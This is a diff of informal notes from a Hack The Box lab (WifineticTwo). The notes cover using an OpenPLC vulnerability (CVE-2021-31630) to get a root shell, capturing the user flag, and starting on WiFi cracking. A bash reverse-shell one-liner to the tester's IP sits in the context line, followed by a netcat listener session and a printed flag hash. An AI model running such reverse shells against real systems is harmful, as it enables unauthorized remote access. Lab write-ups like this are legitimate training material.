@@ -80,4 +80,77 @@ bash -i >& /dev/tcp/10.10.16.74/8000 0>&1
 
 okay turns out i cant even upload it cuz it wants stupid st files
 
+so turns out theres an exploit for openplc from 2021 that i might be able to use. 
+
+
+┌──(root㉿kali)-[/home/…/HTB/yoyo/WifineticTwo/cve-2021-31630]
+└─# nc -lvnp 8000
+listening on [any] 8000 ...
+connect to [10.10.16.74] from (UNKNOWN) [10.10.11.7] 32964
+bash: cannot set terminal process group (171): Inappropriate ioctl for device
+bash: no job control in this shell
+root@attica02:/opt/PLC/OpenPLC_v3/webserver# ls
+ls
+active_program
+core
+dnp3.cfg
+iec2c
+lib
+monitoring.py
+monitoring.pyc
+openplc.db
+openplc.py
+openplc.pyc
+pages.py
+pages.pyc
+scripts
+static
+st_files
+st_optimizer
+webserver.py
+root@attica02:/opt/PLC/OpenPLC_v3/webserver# cd
+cd
+root@attica02:~# ls
+ls
+user.txt
+root@attica02:~# cat user.txt
+cat user.txt
+d7a5f9a5a1dbdf8be409ee4ab1509d91
+root@attica02:~# 
+
+
+
+
+GOT USER FLAG WOOO
+
+
+root@attica02:/etc/wpa_supplicant# iwconfig
+iwconfig
+eth0      no wireless extensions.
+
+lo        no wireless extensions.
+
+wlan0     IEEE 802.11  ESSID:off/any  
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Encryption key:off
+          Power Management:on
+
+
+Encryption key: off. This means your connection on the wireless network is not encrypted and data is being transferred in plaintext. ESSID is just the wireless network name you are connected to.
+
+
+wifi hacking? i dunno how to do this
+
+
+The PMK is computed as follows:
+
+Figure 3 - PMK calculation
+
+https://www.cyberark.com/resources/threat-research-blog/cracking-wifi-at-scale-with-one-simple-trick
+
+so i need to get the password?
+
+
+wlan0 mac address --> 02:00:00:00:03:00
 
